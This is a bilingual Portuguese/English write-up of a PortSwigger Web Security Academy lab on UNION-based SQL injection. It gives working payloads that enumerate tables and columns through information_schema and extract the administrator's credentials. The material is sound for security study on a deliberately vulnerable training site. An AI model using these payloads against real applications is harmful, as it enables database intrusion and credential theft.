# Lab 05 — UNION Attack: Listing Database Contents (Non-Oracle)

> 🇧🇷 [Português](#-português) · 🇺🇸 [English](#-english)

---

## 🇧🇷 Português

**Plataforma:** PortSwigger Web Security Academy  
**Categoria:** SQL Injection — UNION Attack  
**Dificuldade:** 🟡 Practitioner  
**Data:** 2026-06-06

### Descrição

O filtro de categorias é vulnerável a UNION attack. O banco contém uma tabela com usernames e senhas. O objetivo é descobrir o nome dessa tabela, extrair as credenciais e fazer login como `administrator`.

### Conceito

Em bancos não-Oracle (PostgreSQL, MySQL, MSSQL), o `information_schema` é uma estrutura padrão que cataloga todos os objetos do banco — tabelas, colunas, tipos. É o ponto de partida para enumeração de schema via SQLi:

- `information_schema.tables` → lista todas as tabelas
- `information_schema.columns` → lista todas as colunas de uma tabela específica

### Reconhecimento

Confirmação de duas colunas aceitando texto:

```
'+UNION+SELECT+'abc','def'--
```

### Exploração

**Passo 1 — Listar todas as tabelas:**

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

Na resposta, foi identificada uma tabela com nome parecido com `users_abcdef`.

**Passo 2 — Listar colunas dessa tabela:**

```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

As colunas retornadas incluíam `username_abcdef` e `password_abcdef`.

**Passo 3 — Extrair credenciais:**

```
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

A senha do `administrator` foi retornada na resposta. Login realizado com sucesso.

### O que aprendi

- `information_schema` é a chave para enumeração de schema em bancos não-Oracle
- O ataque segue uma progressão lógica: tabelas → colunas → dados
- Nomes de tabelas e colunas podem ter sufixos aleatórios — enumeração é necessária, não se pode assumir nomes padrão

### Referências

- [PortSwigger — Examining the Database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 🇺🇸 English

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection — UNION Attack  
**Difficulty:** 🟡 Practitioner  
**Date:** 2026-06-06

### Description

The category filter is vulnerable to a UNION attack. The database contains a table with usernames and passwords. The goal is to find that table's name, extract the credentials, and log in as `administrator`.

### Concept

In non-Oracle databases (PostgreSQL, MySQL, MSSQL), `information_schema` is a standard structure cataloging all database objects — tables, columns, types. It's the starting point for schema enumeration via SQLi:

- `information_schema.tables` → lists all tables
- `information_schema.columns` → lists all columns for a specific table

### Reconnaissance

Confirming two text-accepting columns:

```
'+UNION+SELECT+'abc','def'--
```

### Exploitation

**Step 1 — List all tables:**

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

The response revealed a table named something like `users_abcdef`.

**Step 2 — List columns in that table:**

```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

Returned columns included `username_abcdef` and `password_abcdef`.

**Step 3 — Extract credentials:**

```
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

The `administrator` password was returned in the response. Login completed successfully.

### What I learned

- `information_schema` is the key to schema enumeration in non-Oracle databases
- The attack follows a logical progression: tables → columns → data
- Table and column names may have random suffixes — enumeration is required, you can't assume standard names

### References

- [PortSwigger — Examining the Database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
